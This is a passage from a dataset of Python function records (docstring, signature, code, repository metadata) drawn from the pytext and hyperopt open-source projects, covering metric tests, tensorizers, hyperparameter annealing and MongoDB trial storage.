  ),\n)\n\n# Test multiple pairs consisting of the 8th through the 11th examples\nself.assertMetricsAlmostEqual(\n    compute_intent_slot_metrics(FRAME_PAIRS[7:11], tree_based=False),\n    IntentSlotMetrics(\n        intent_metrics=PRF1Metrics(\n            per_label_scores={\n                # intent1: TP = 4, FP = 0, FN = 0\n                \"intent1\": PRF1Scores(4, 0, 0, 1.0, 1.0, 1.0),\n                # intent2: TP = 1, FP = 2, FN = 1\n                \"intent2\": PRF1Scores(1, 2, 1, 1.0 / 3, 0.5, 0.4),\n            },\n            macro_scores=MacroPRF1Scores(2, 2.0 / 3, 0.75, 0.7),\n            # all intents: TP = 5, FP = 2, FN = 1\n            micro_scores=PRF1Scores(5, 2, 1, 5.0 / 7, 5.0 / 6, 10.0 / 13),\n        ),\n        slot_metrics=PRF1Metrics(\n            per_label_scores={\n                # slot1: TP = 3, FP = 1, FN = 1\n                \"slot1\": PRF1Scores(3, 1, 1, 0.75, 0.75, 0.75),\n                # slot2: TP = 2, FP = 2, FN = 0\n                \"slot2\": PRF1Scores(2, 2, 0, 0.5, 1.0, 4.0 / 6),\n                # slot3: TP = 1, FP = 1, FN = 0\n                \"slot3\": PRF1Scores(1, 1, 0, 0.5, 1.0, 2.0 / 3),\n                # slot4: TP = 0, FP = 1, FN = 1\n                \"slot4\": PRF1Scores(0, 1, 1, 0.0, 0.0, 0.0),\n            },\n            macro_scores=MacroPRF1Scores(4, 0.4375, 0.6875, 25.0 / 48),\n            # all slots: TP = 6, FP = 5, FN = 2\n            micro_scores=PRF1Scores(6, 5, 2, 6.0 / 11, 6.0 / 8, 12.0 / 19),\n        ),\n        # overall: TP = 11, FP = 7, FN = 3\n        overall_metrics=PRF1Scores(11, 7, 3, 11.0 / 18, 11.0 / 14, 22.0 / 32),\n    ),\n)\n\nself.assertMetricsAlmostEqual(\n    compute_intent_slot_metrics(FRAME_PAIRS[7:11], tree_based=True),\n    IntentSlotMetrics(\n        intent_metrics=PRF1Metrics(\n            per_label_scores={\n                # intent1: TP = 1, FP = 3, FN = 3\n                \"intent1\": PRF1Scores(1, 3, 3, 0.25, 0.25, 0.25),\n                # intent2: TP = 1, FP = 2, FN = 1\n                \"intent2\": PRF1Scores(1, 2, 1, 1.0 / 3, 0.5, 0.4),\n            },\n            macro_scores=MacroPRF1Scores(2, 7.0 / 24, 0.375, 0.325),\n            # all intents: TP = 2, FP = 5, FN = 4\n            micro_scores=PRF1Scores(2, 5, 4, 2.0 / 7, 2.0 / 6, 4.0 / 13),\n        ),\n        slot_metrics=PRF1Metrics(\n            per_label_scores={\n                # slot1: TP = 2, FP = 2, FN = 2\n                \"slot1\": PRF1Scores(2, 2, 2, 0.5, 0.5, 0.5),\n                # slot2: TP = 2, FP = 2, FN = 0\n                \"slot2\": PRF1Scores(2, 2, 0, 0.5, 1.0, 4.0 / 6),\n                # slot3: TP = 1, FP = 1, FN = 0\n                \"slot3\": PRF1Scores(1, 1, 0, 0.5, 1.0, 2.0 / 3),\n                # slot4: TP = 0, FP = 1, FN = 1\n                \"slot4\": PRF1Scores(0, 1, 1, 0.0, 0.0, 0.0),\n            },\n            macro_scores=MacroPRF1Scores(4, 0.375, 0.625, 11.0 / 24),\n            # all slots: TP = 5, FP = 6, FN = 3\n            micro_scores=PRF1Scores(5, 6, 3, 5.0 / 11, 5.0 / 8, 10.0 / 19),\n        ),\n        # overall: TP = 7, FP = 11, FN = 7\n        overall_metrics=PRF1Scores(7, 11, 7, 7.0 / 18, 7.0 / 14, 14.0 / 32),\n    ),\n)", "path": "pytext/pytext/metrics/tests/intent_slot_metrics_test.py", "commit_date": "2019-03-07 00:00:00", "repo_name": "facebookresearch/pytext", "stars": 6351, "license": "other", "language": "python", "size": 8448}
{"docstring": "\"\"\"\nGenerate human readable predictions\n\"\"\"\n", "func_signal": "def predictions_to_report(self):\n", "code": "return [\n    [\n        self.label_names[pred_idx]\n        for pred_idx, pred in enumerate(predictions)\n        if pred == 1\n    ]\n    for predictions in self.all_preds\n]", "path": "pytext/pytext/metric_reporters/classification_metric_reporter.py", "commit_date": "2020-06-23 00:00:00", "repo_name": "facebookresearch/pytext", "stars": 6351, "license": "other", "language": "python", "size": 8448}
{"docstring": "\"\"\"Build vocabulary based on training corpus.\"\"\"\n", "func_signal": "def initialize(self, vocab_builder=None, from_scratch=True):\n", "code": "if self.vocab and from_scratch:\n    return\nif not self.vocab_builder:\n    self.vocab_builder = vocab_builder or VocabBuilder()\n    self.vocab_builder.use_bos = self.add_bos_token\n    self.vocab_builder.use_eos = self.add_eos_token\n    self.vocab_builder.use_bol = self.add_bol_token\n    self.vocab_builder.use_eol = self.add_eol_token\n\ntry:\n    while True:\n        row = yield\n        for raw_text in row[self.column]:\n            tokenized = self.tokenizer.tokenize(raw_text)\n            self.vocab_builder.add_all([t.value for t in tokenized])\nexcept GeneratorExit:\n    self.vocab = self.vocab_builder.make_vocab()", "path": "pytext/pytext/data/tensorizers.py", "commit_date": "2020-12-16 00:00:00", "repo_name": "facebookresearch/pytext", "stars": 6351, "license": "other", "language": "python", "size": 8448}
{"docstring": "\"\"\"Tokenize, look up in vocabulary, return tokenized_texts in raw text\"\"\"\n", "func_signal": "def prepare_input(self, row):\n", "code": "tokenized_texts, start_idx, end_idx = self._tokenize(row[self.text_column])\ntoken_ranges = list(zip(start_idx, end_idx))\nreturn list(tokenized_texts), len(tokenized_texts), token_ranges", "path": "pytext/pytext/data/tensorizers.py", "commit_date": "2020-12-16 00:00:00", "repo_name": "facebookresearch/pytext", "stars": 6351, "license": "other", "language": "python", "size": 8448}
{"docstring": "# start reading through data source\n", "func_signal": "def initialize(self, from_scratch=True):\n", "code": "while True:\n    yield", "path": "pytext/pytext/data/tensorizers.py", "commit_date": "2020-12-16 00:00:00", "repo_name": "facebookresearch/pytext", "stars": 6351, "license": "other", "language": "python", "size": 8448}
{"docstring": "\"\"\"\nThis functions will receive a list(e.g a batch) of outputs\nfrom function numberize(), padding and convert to output tensors.\n\nIt will be called in PyText Tensorizer during training time, this\nfunction is not torchscriptiable because it depends on cuda.device().\n\"\"\"\n", "func_signal": "def tensorize_wrapper(self, *args, **kwargs):\n", "code": "with to_device(self, cuda.device()):\n    return self.tensorize(*args, **kwargs)", "path": "pytext/pytext/data/tensorizers.py", "commit_date": "2020-12-16 00:00:00", "repo_name": "facebookresearch/pytext", "stars": 6351, "license": "other", "language": "python", "size": 8448}
{"docstring": "\"\"\"\nNumberize dict features. Fill in for tokens with no features with\nPAD and weight 0.0. All tokens need to have at least one entry.\nTokens with more than one feature will have multiple idx and weight\nadded in sequence.\n\"\"\"\n\n", "func_signal": "def numberize(self, row):\n", "code": "num_tokens = len(self.tokenizer.tokenize(row[self.text_column]))\nnum_labels = max(len(t[\"features\"]) for t in row[self.dict_column])\nres_idx = [self.vocab.get_pad_index()] * (num_labels * num_tokens)\nres_weights = [0.0] * (num_labels * num_tokens)\nres_lens = [1] * num_tokens\nfor dict_feature in row[self.dict_column]:\n    idx = dict_feature[\"tokenIdx\"]\n    feats = dict_feature[\"features\"]\n    pos = idx * num_labels\n    res_lens[idx] = len(feats)\n    # write values at the correct pos\n    for label, weight in feats.items():\n        res_idx[pos] = self.vocab.lookup_all(label)\n        res_weights[pos] = weight\n        pos += 1\n\nreturn res_idx, res_weights, res_lens", "path": "pytext/pytext/data/tensorizers.py", "commit_date": "2020-12-16 00:00:00", "repo_name": "facebookresearch/pytext", "stars": 6351, "license": "other", "language": "python", "size": 8448}
{"docstring": "\"\"\"Tokenize, look up in vocabulary.\"\"\"\n", "func_signal": "def numberize(self, row):\n", "code": "tokens, start_idx, end_idx = self._lookup_tokens(row[self.text_column])\ntoken_ranges = list(zip(start_idx, end_idx))\nreturn tokens, len(tokens), token_ranges", "path": "pytext/pytext/data/tensorizers.py", "commit_date": "2020-12-16 00:00:00", "repo_name": "facebookresearch/pytext", "stars": 6351, "license": "other", "language": "python", "size": 8448}
{"docstring": "# Pre-process\n", "func_signal": "def predict(text):\n", "code": "tokens, token_ranges = tokenize(text)\n\n# Make prediction\nworkspace.blobs[\"tokens_vals_str:value\"] = np.array([tokens], dtype=str)\nworkspace.blobs[\"tokens_lens\"] = np.array([len(tokens)], dtype=np.int_)\nworkspace.RunNet(predict_net)\nlabels_scores = [\n    (str(blob), workspace.blobs[blob][0])\n    for blob in predict_net.external_outputs\n    if \"word_scores\" in str(blob)\n]\nlabels = list(zip(*labels_scores))[0]\nscores = list(zip(*labels_scores))[1]  # len(tokens) x 1\n\n# Post-processing (find city names)\nall_scores = np.concatenate(scores, axis=1)  # len(tokens) x len(labels)\npredicted_labels = np.argmax(all_scores, axis=1)  # len(tokens)\n\ncity_token_ranges = []\nprev_label = \"\"\nfor token_idx, label_idx in enumerate(predicted_labels):\n    label = labels[label_idx]\n    if \"city_name\" in label:\n        if prev_label == label:\n            city_token_ranges[-1] = (\n                city_token_ranges[-1][0],\n                token_ranges[token_idx][1],\n            )\n        else:\n            city_token_ranges.append(token_ranges[token_idx])\n    prev_label = label\nreturn city_token_ranges", "path": "pytext/demo/flask_server/atis.py", "commit_date": "2019-10-03 00:00:00", "repo_name": "facebookresearch/pytext", "stars": 6351, "license": "other", "language": "python", "size": 8448}
{"docstring": "\"\"\"\nLook through the dataset for all labels and create a vocab map for them.\n\"\"\"\n", "func_signal": "def initialize(self, from_scratch=True):\n", "code": "if self.vocab and from_scratch:\n    return\ntry:\n    while True:\n        row = yield\n        labels = row[self.label_column]\n        self.vocab_builder.add_all(labels)\nexcept GeneratorExit:\n    if self.add_labels:\n        self.vocab_builder.add_all(self.add_labels)\n    self.vocab, self.pad_idx = self._create_vocab()", "path": "pytext/pytext/data/tensorizers.py", "commit_date": "2020-12-16 00:00:00", "repo_name": "facebookresearch/pytext", "stars": 6351, "license": "other", "language": "python", "size": 8448}
{"docstring": "\"\"\"\nLook through the dataset for all dict features to create vocab.\n\"\"\"\n", "func_signal": "def initialize(self, from_scratch=True):\n", "code": "if self.vocab and from_scratch:\n    return\ntry:\n    while True:\n        row = yield\n        for token_dict in row[self.dict_column]:\n            self.vocab_builder.add_all(token_dict[\"features\"])\nexcept GeneratorExit:\n    self.vocab = self.vocab_builder.make_vocab()", "path": "pytext/pytext/data/tensorizers.py", "commit_date": "2020-12-16 00:00:00", "repo_name": "facebookresearch/pytext", "stars": 6351, "license": "other", "language": "python", "size": 8448}
{"docstring": "\"\"\"\nReturn `vals[which]` where `which` is a subset of `idxs`\n\"\"\"\n# TODO: consider insisting on sorted idxs\n# TODO: use np.searchsorted instead of dct\n", "func_signal": "def idxs_take(idxs, vals, which):\n", "code": "assert len(idxs) == len(vals)\ntable = dict(list(zip(idxs, vals)))\nreturn np.asarray([table[w] for w in which])", "path": "hyperopt/hyperopt/vectorize.py", "commit_date": "2020-10-27 00:00:00", "repo_name": "hyperopt/hyperopt", "stars": 7021, "license": "other", "language": "python", "size": 6142}
{"docstring": "\"\"\"\nParameters: See `hp_uniform`\n\"\"\"\n", "func_signal": "def hp_randint(self, memo, node, label, tid, val):\n", "code": "low = memo[node.arg[\"low\"]]\nhigh = memo.get(node.arg[\"high\"])\n# if high is None, the domain is [0, low), else it is [low, high)\ndomain_size = low if high is None else high - low\noffset = 0 if high is None else low\nval1 = np.atleast_1d(val)\nif val1.size:\n    counts = old_div(\n        bincount(val1, offset=offset, minlength=domain_size), float(val1.size)\n    )\nelse:\n    counts = np.zeros(domain_size)\nprior = self.shrinking(label)\np = (1 - prior) * counts + prior * (old_div(1.0, domain_size))\nrval = categorical(p=p, rng=self.rng, size=memo[node.arg[\"size\"]]) + offset\nreturn rval", "path": "hyperopt/hyperopt/anneal.py", "commit_date": "2020-10-27 00:00:00", "repo_name": "hyperopt/hyperopt", "stars": 7021, "license": "other", "language": "python", "size": 6142}
{"docstring": "\"\"\"Return a job dictionary by inserting the job dict into the database\"\"\"\n", "func_signal": "def insert(self, job):\n", "code": "try:\n    cpy = copy.deepcopy(job)\n    # -- this call adds an _id field to cpy\n    _id = self.jobs.insert(cpy, check_keys=True)\n    # -- so now we return the dict with the _id field\n    assert _id == cpy[\"_id\"]\n    return cpy\nexcept pymongo.errors.OperationFailure as e:\n    # -- translate pymongo error class into hyperopt error class\n    #    This was meant to make it easier to catch insertion errors\n    #    in a generic way even if different databases were used.\n    #    ... but there's just MongoDB so far, so kinda goofy.\n    raise OperationFailure(e)", "path": "hyperopt/hyperopt/mongoexp.py", "commit_date": "2020-11-18 00:00:00", "repo_name": "hyperopt/hyperopt", "stars": 7021, "license": "other", "language": "python", "size": 6142}
{"docstring": "\"\"\"\nThis recursive procedure should be called on an output-node.\n\"\"\"\n", "func_signal": "def build_idxs_vals(self, node, wanted_idxs):\n", "code": "checkpoint_asserts = False\n\ndef checkpoint():\n    if checkpoint_asserts:\n        self.assert_integrity_idxs_take()\n        if node in self.idxs_memo:\n            toposort(self.idxs_memo[node])\n        if node in self.take_memo:\n            for take in self.take_memo[node]:\n                toposort(take)\n\ncheckpoint()\n\n# wanted_idxs are fixed, whereas idxs_memo\n# is full of unions, that can grow in subsequent recursive\n# calls to build_idxs_vals with node as argument.\nassert wanted_idxs != self.idxs_memo.get(node)\n\n# -- easy exit case\nif node.name == \"hyperopt_param\":\n    # -- ignore, not vectorizing\n    return self.build_idxs_vals(node.arg[\"obj\"], wanted_idxs)\n\n# -- easy exit case\nelif node.name == \"hyperopt_result\":\n    # -- ignore, not vectorizing\n    return self.build_idxs_vals(node.arg[\"obj\"], wanted_idxs)\n\n# -- literal case: always take from universal set\nelif node.name == \"literal\":\n    if node in self.idxs_memo:\n        all_idxs, all_vals = self.take_memo[node][0].pos_args[:2]\n        wanted_vals = scope.idxs_take(all_idxs, all_vals, wanted_idxs)\n        self.take_memo[node].append(wanted_vals)\n        checkpoint()\n    else:\n        # -- initialize idxs_memo to full set\n        all_idxs = self.expr_idxs\n        n_times = scope.len(all_idxs)\n        # -- put array_union into graph for consistency, though it is\n        # not necessary\n        all_idxs = scope.array_union(all_idxs)\n        self.idxs_memo[node] = all_idxs\n        all_vals = scope.asarray(scope.repeat(n_times, node))\n        wanted_vals = scope.idxs_take(all_idxs, all_vals, wanted_idxs)\n        assert node not in self.take_memo\n        self.take_memo[node] = [wanted_vals]\n        checkpoint()\n    return wanted_vals\n\n# -- switch case: complicated\nelif node.name == \"switch\":\n    if node in self.idxs_memo and wanted_idxs in self.idxs_memo[node].pos_args:\n        # -- phew, easy case\n        all_idxs, all_vals = self.take_memo[node][0].pos_args[:2]\n        wanted_vals = scope.idxs_take(all_idxs, all_vals, wanted_idxs)\n        self.take_memo[node].append(wanted_vals)\n        checkpoint()\n    else:\n        # -- we need to add some indexes\n        if node in self.idxs_memo:\n            all_idxs = self.idxs_memo[node]\n            assert all_idxs.name == \"array_union\"\n            all_idxs.pos_args.append(wanted_idxs)\n        else:\n            all_idxs = scope.array_union(wanted_idxs)\n\n        choice = node.pos_args[0]\n        all_choices = self.build_idxs_vals(choice, all_idxs)\n\n        options = node.pos_args[1:]\n        args_idxs = scope.vchoice_split(all_idxs, all_choices, len(options))\n        all_vals = scope.vchoice_merge(all_idxs, all_choices)\n        for opt_ii, idxs_ii in zip(options, args_idxs):\n            all_vals.pos_args.append(\n                as_apply([idxs_ii, self.build_idxs_vals(opt_ii, idxs_ii)])\n            )\n\n        wanted_vals = scope.idxs_take(\n            all_idxs,  # -- may grow in future\n            all_vals,  # -- may be replaced in future\n            wanted_idxs,\n        )  # -- fixed.\n        if node in self.idxs_memo:\n            assert self.idxs_memo[node].name == \"array_union\"\n            self.idxs_memo[node].pos_args.append(wanted_idxs)\n            for take in self.take_memo[node]:\n                assert take.name == \"idxs_take\"\n                take.pos_args[1] = all_vals\n            self.take_memo[node].append(wanted_vals)\n        else:\n            self.idxs_memo[node] = all_idxs\n            self.take_memo[node] = [wanted_vals]\n        checkpoint()\n\n# -- general case\nelse:\n    # -- this is a general node.\n    #    It is generally handled with idxs_memo,\n    #    but vectorize_stochastic may immediately transform it into\n    #    a more compact form.\n    if node in self.idxs_memo and wanted_idxs in self.idxs_memo[node].pos_args:\n        # -- phew, easy case\n        for take in self.take_memo[node]:\n            if take.pos_args[2] == wanted_idxs:\n                return take\n        raise NotImplementedError(\"how did this happen?\")\n        # all_idxs, all_vals = self.take_memo[node][0].pos_args[:2]\n        # wanted_vals = scope.idxs_take(all_idxs, all_vals, wanted_idxs)\n        # self.take_memo[node].append(wanted_vals)\n        # checkpoint()\n    else:\n        # XXX\n        # -- determine if wanted_idxs is actually a subset of the idxs\n        # that we are already computing.  This is not only an\n        # optimization, but prevents the creation of cycles, which\n        # would otherwise occur if we have a graph of the form\n        # switch(f(a), g(a), 0). If there are other switches inside f\n        # and g, does this get trickier?\n\n        # -- assume we need to add some indexes\n        checkpoint()\n        if node in self.idxs_memo:\n            all_idxs = self.idxs_memo[node]\n\n        else:\n            all_idxs = scope.array_union(wanted_idxs)\n        checkpoint()\n\n        all_vals = scope.idxs_map(all_idxs, node.name)\n        for ii, aa in enumerate(node.pos_args):\n            all_vals.pos_args.append(\n                as_apply([all_idxs, self.build_idxs_vals(aa, all_idxs)])\n            )\n            checkpoint()\n        for ii, (nn, aa) in enumerate(node.named_args):\n            all_vals.named_args.append(\n                [nn, as_apply([all_idxs, self.build_idxs_vals(aa, all_idxs)])]\n            )\n            checkpoint()\n        all_vals = vectorize_stochastic(all_vals)\n\n        checkpoint()\n        wanted_vals = scope.idxs_take(\n            all_idxs,  # -- may grow in future\n            all_vals,  # -- may be replaced in future\n            wanted_idxs,\n        )  # -- fixed.\n        if node in self.idxs_memo:\n            assert self.idxs_memo[node].name == \"array_union\"\n            self.idxs_memo[node].pos_args.append(wanted_idxs)\n            toposort(self.idxs_memo[node])\n            # -- this catches the cycle bug mentioned above\n            for take in self.take_memo[node]:\n                assert take.name == \"idxs_take\"\n                take.pos_args[1] = all_vals\n            self.take_memo[node].append(wanted_vals)\n        else:\n            self.idxs_memo[node] = all_idxs\n            self.take_memo[node] = [wanted_vals]\n        checkpoint()\n\nreturn wanted_vals", "path": "hyperopt/hyperopt/vectorize.py", "commit_date": "2020-10-27 00:00:00", "repo_name": "hyperopt/hyperopt", "stars": 7021, "license": "other", "language": "python", "size": 6142}
{"docstring": "\"\"\"\nAttachments to a single trial (e.g. learned weights)\n\nReturns a dictionary interface to the attachments.\n\"\"\"\n\n# don't offer more here than in MongoCtrl\n", "func_signal": "def trial_attachments(self, trial):\n", "code": "class Attachments:\n    def __init__(self, handle: MongoJobs):\n        self.handle = handle\n\n    def __contains__(self, name):\n        return name in self.handle.attachment_names(doc=trial)\n\n    def __len__(self):\n        return len(self.handle.attachment_names(doc=trial))\n\n    def __iter__(self):\n        return iter(self.handle.attachment_names(doc=trial))\n\n    def __getitem__(self, name):\n        try:\n            return self.handle.get_attachment(doc=trial, name=name)\n        except OperationFailure:\n            raise KeyError(name)\n\n    def __setitem__(self, name, value):\n        self.handle.set_attachment(\n            doc=trial, blob=value, name=name, collection=self.handle.db.jobs\n        )\n\n    def __delitem__(self, name):\n        raise NotImplementedError(\"delete trial_attachment\")\n\n    def keys(self):\n        return [k for k in self]\n\n    def values(self):\n        return [self[k] for k in self]\n\n    def items(self):\n        return [(k, self[k]) for k in self]\n\nreturn Attachments(self.handle)", "path": "hyperopt/hyperopt/mongoexp.py", "commit_date": "2020-11-18 00:00:00", "repo_name": "hyperopt/hyperopt", "stars": 7021, "license": "other", "language": "python", "size": 6142}
{"docstring": "\"\"\"Sync documents with `['tid']` in the list of `tids` from the\ndatabase (not *to* the database).\n\nLocal trial documents whose tid is not in `tids` are not\naffected by this call.  Local trial documents whose tid is in `tids` may\nbe:\n\n* *deleted* (if db no longer has corresponding document), or\n* *updated* (if db has an updated document) or,\n* *left alone* (if db document matches local one).\n\nAdditionally, if the db has a matching document, but there is no\nlocal trial with a matching tid, then the db document will be\n*inserted* into the local collection.\n\n\"\"\"\n", "func_signal": "def refresh_tids(self, tids):\n", "code": "exp_key = self._exp_key\nquery = {\"exp_key\": exp_key} if exp_key != None else {}\nt0 = time.time()\nquery[\"state\"] = {\"$ne\": JOB_STATE_ERROR}\nif tids is not None:\n    query[\"tid\"] = {\"$in\": list(tids)}\norig_trials = getattr(self, \"_trials\", [])\n_trials = orig_trials[:]  # copy to make sure it doesn't get screwed up\nif _trials:\n    db_data = list(self.handle.jobs.find(query, projection=[\"_id\", \"version\"]))\n    # -- pull down a fresh list of ids from mongo\n    if db_data:\n        # make numpy data arrays\n        db_data = numpy.rec.array(\n            [(x[\"_id\"], int(x[\"version\"])) for x in db_data],\n            names=[\"_id\", \"version\"],\n        )\n        db_data.sort(order=[\"_id\", \"version\"])\n        db_data = db_data[get_most_recent_inds(db_data)]\n\n        existing_data = numpy.rec.array(\n            [(x[\"_id\"], int(x[\"version\"])) for x in _trials],\n            names=[\"_id\", \"version\"],\n        )\n        existing_data.sort(order=[\"_id\", \"version\"])\n\n        # which records are in db but not in existing, and vice versa\n        db_in_existing = fast_isin(db_data[\"_id\"], existing_data[\"_id\"])\n        existing_in_db = fast_isin(existing_data[\"_id\"], db_data[\"_id\"])\n\n        # filtering out out-of-date records\n        _trials = [_trials[_ind] for _ind in existing_in_db.nonzero()[0]]\n\n        # new data is what's in db that's not in existing\n        new_data = db_data[numpy.invert(db_in_existing)]\n\n        # having removed the new and out of data data,\n        # concentrating on data in db and existing for state changes\n        db_data = db_data[db_in_existing]\n        existing_data = existing_data[existing_in_db]\n        try:\n            assert len(db_data) == len(existing_data)\n            assert (existing_data[\"_id\"] == db_data[\"_id\"]).all()\n            assert (existing_data[\"version\"] <= db_data[\"version\"]).all()\n        except:\n            report_path = os.path.join(\n                os.getcwd(),\n                \"hyperopt_refresh_crash_report_\"\n                + str(numpy.random.randint(1e8))\n                + \".pkl\",\n            )\n            logger.error(\n                \"HYPEROPT REFRESH ERROR: writing error file to %s\" % report_path\n            )\n            _file = open(report_path, \"w\")\n            pickler.dump(\n                {\"db_data\": db_data, \"existing_data\": existing_data}, _file\n            )\n            _file.close()\n            raise\n\n        same_version = existing_data[\"version\"] == db_data[\"version\"]\n        _trials = [_trials[_ind] for _ind in same_version.nonzero()[0]]\n        version_changes = existing_data[numpy.invert(same_version)]\n\n        # actually get the updated records\n        update_ids = new_data[\"_id\"].tolist() + version_changes[\"_id\"].tolist()\n        num_new = len(update_ids)\n        update_query = copy.deepcopy(query)\n        update_query[\"_id\"] = {\"$in\": update_ids}\n        updated_trials = list(self.handle.jobs.find(update_query))\n        _trials.extend(updated_trials)\n    else:\n        num_new = 0\n        _trials = []\nelse:\n    # this case is for performance, though should be able to be removed\n    # without breaking correctness.\n    _trials = list(self.handle.jobs.find(query))\n    if _trials:\n        _trials = [_trials[_i] for _i in get_most_recent_inds(_trials)]\n    num_new = len(_trials)\n\nlogger.debug(\n    \"Refresh data download took %f seconds for %d ids\"\n    % (time.time() - t0, num_new)\n)\n\nif tids is not None:\n    # -- If tids were given, then _trials only contains\n    #    documents with matching tids. Here we augment these\n    #    fresh matching documents, with our current ones whose\n    #    tids don't match.\n    new_trials = _trials\n    tids_set = set(tids)\n    assert all(t[\"tid\"] in tids_set for t in new_trials)\n    old_trials = [t for t in orig_trials if t[\"tid\"] not in tids_set]\n    _trials = new_trials + old_trials\n\n# -- reassign new trials to self, in order of increasing tid\njarray = numpy.array([j[\"_id\"] for j in _trials])\njobsort = jarray.argsort()\nself._trials = [_trials[_idx] for _idx in jobsort]\nself._specs = [_trials[_idx][\"spec\"] for _idx in jobsort]\nself._results = [_trials[_idx][\"result\"] for _idx in jobsort]\nself._miscs = [_trials[_idx][\"misc\"] for _idx in jobsort]", "path": "hyperopt/hyperopt/mongoexp.py", "commit_date": "2020-11-18 00:00:00", "repo_name": "hyperopt/hyperopt", "stars": 7021, "license": "other", "language": "python", "size": 6142}
{"docstring": "\"\"\"\nAttachments to a Trials set (such as bandit args).\n\nSupport syntax for load:  self.attachments[name]\nSupport syntax for store: self.attachments[name] = value\n\"\"\"\n", "func_signal": "def attachments(self):\n", "code": "gfs = self.handle.gfs\n\nquery = {}\nif self._exp_key:\n    query[\"exp_key\"] = self._exp_key\n\nclass Attachments:\n    def __iter__(_self):\n        if query:\n            # -- gfs.list does not accept query kwargs\n            #    (at least, as of pymongo 2.4)\n            filenames = [fname for fname in gfs.list() if fname in _self]\n        else:\n            filenames = gfs.list()\n        return iter(filenames)\n\n    def __contains__(_self, name):\n        return gfs.exists(filename=name, **query)\n\n    def __getitem__(_self, name):\n        try:\n            rval = gfs.get_version(filename=name, **query).read()\n            return rval\n        except gridfs.NoFile:\n            raise KeyError(name)\n\n    def __setitem__(_self, name, value):\n        if gfs.exists(filename=name, **query):\n            gout = gfs.get_last_version(filename=name, **query)\n            gfs.delete(gout._id)\n        gfs.put(value, filename=name, encoding=\"utf-8\", **query)\n\n    def __delitem__(_self, name):\n        gout = gfs.get_last_version(filename=name, **query)\n        gfs.delete(gout._id)\n\nreturn Attachments()", "path": "hyperopt/hyperopt/mongoexp.py", "commit_date": "2020-11-18 00:00:00", "repo_name": "hyperopt/hyperopt", "stars": 7021, "license": "other", "language": "python", "size": 6142}
{"docstring": "\"\"\"\nParameters: See `hp_uniform`\n\"\"\"\n", "func_signal": "def hp_lognormal(self, memo, node, label, tid, val):\n", "code": "return lognormal(\n    mu=np.log(val),\n    sigma=memo[node.arg[\"sigma\"]] * self.shrinking(label),\n    rng=self.rng,\n    size=memo[node.arg[\"size\"]],\n)", "path": "hyperopt/hyperopt/anneal.py", "commit_date": "2020-10-27 00:00:00", "repo_name": "hyperopt/hyperopt", "stars": 7021, "license": "other", "language": "python", "size": 6142}
{"docstring": "\"\"\"\nParameters: See `hp_uniform`\n\"\"\"\n", "func_signal": "def hp_normal(self, memo, node, label, tid, val):\n", "code": "return normal(\n    mu=val,\n    sigma=memo[node.arg[\"sigma\"]] * self.shrinking(label),\n    rng=self.rng,\n    size=memo[node.arg[\"size\"]],\n)", "path": "hyperopt/hyperopt/anneal.py", "commit_date": "2020-10-27 00:00:00", "repo_name": "hyperopt/hyperopt", "stars": 7021, "license": "other", "language": "python", "size": 6142}
{"docstring": "\"\"\"\nParameters\n----------\n\ndb - Mongo Database (e.g. `Connection()[dbname]`)\n    database in which all job-related info is stored\n\njobs - Mongo Collection handle\n    collection within `db` to use for job arguments, return vals,\n    and various bookkeeping stuff and meta-data. Typically this is\n    `db['jobs']`\n\ngfs - Mongo GridFS handle\n    GridFS is used to store attachments - binary blobs that don't fit\n    or are awkward to store in the `jobs` collection directly.\n\nconn - Mongo Connection\n    Why we need to keep this, I'm not sure.\n\ntunnel - something for ssh tunneling if you're doing that\n    See `connection_with_tunnel` for more info.\n\nconfig_name - string\n    XXX: No idea what this is for, seems unimportant.\n\n\"\"\"\n", "func_signal": "def __init__(self, db, jobs, gfs, conn, tunnel, config_name):\n", "code": "if not _has_mongo:\n    raise Exception(\n        \"MongoJobs cannot import pymongo classes.  Make sure that pymongo \"\n        \"is available in your environment.  E.g., try running 'import pymongo'\"\n    )\n\nself.db = db\nself.jobs = jobs\nself.gfs = gfs\nself.conn = conn\nself.tunnel = tunnel\nself.config_name = config_name", "path": "hyperopt/hyperopt/mongoexp.py", "commit_date": "2020-11-18 00:00:00", "repo_name": "hyperopt/hyperopt", "stars": 7021, "license": "other", "language": "python", "size": 6142}
{"docstring": "\"\"\"Return union of doc and dct, after making sure that dct has been\nadded to doc in `collection`.\n\nThis function does not modify either `doc` or `dct`.\n\n\"\"\"\n", "func_signal": "def update(self, doc, dct, collection=None, do_sanity_checks=True):\n", "code": "if collection is None:\n    collection = self.collection\n\ndct = copy.deepcopy(dct)\nif \"_id\" not in doc:\n    raise ValueError('doc must have an \"_id\" key to be updated')\n\nif \"_id\" in dct:\n    if dct[\"_id\"] != doc[\"_id\"]:\n        raise ValueError(\"cannot update the _id field\")\n    del dct[\"_id\"]\n\nif \"version\" in dct:\n    if dct[\"version\"] != doc[\"version\"]:\n        warnings.warn('Ignoring \"version\" field in update dictionary')\n\nif \"version\" in doc:\n    doc_query = dict(_id=doc[\"_id\"], version=doc[\"version\"])\n    dct[\"version\"] = doc[\"version\"] + 1\nelse:\n    doc_query = dict(_id=doc[\"_id\"])\n    dct[\"version\"] = 1\ntry:\n    # warning - if doc matches nothing then this function succeeds\n    # N.B. this matches *at most* one entry, and possibly zero\n    collection.update(doc_query, {\"$set\": dct}, upsert=False, multi=False)\nexcept pymongo.errors.OperationFailure as e:\n    # -- translate pymongo error class into hyperopt error class\n    #    see insert() code for rationale.\n    raise OperationFailure(e)\n\n# update doc in-place to match what happened on the server side\ndoc.update(dct)\n\nif do_sanity_checks:\n    server_doc = collection.find_one(\n        dict(_id=doc[\"_id\"], version=doc[\"version\"])\n    )\n    if server_doc is None:\n        raise OperationFailure(\"updated doc not found : %s\" % str(doc))\nreturn doc", "path": "hyperopt/hyperopt/mongoexp.py", "commit_date": "2020-11-18 00:00:00", "repo_name": "hyperopt/hyperopt", "stars": 7021, "license": "other", "language": "python", "size": 6142}
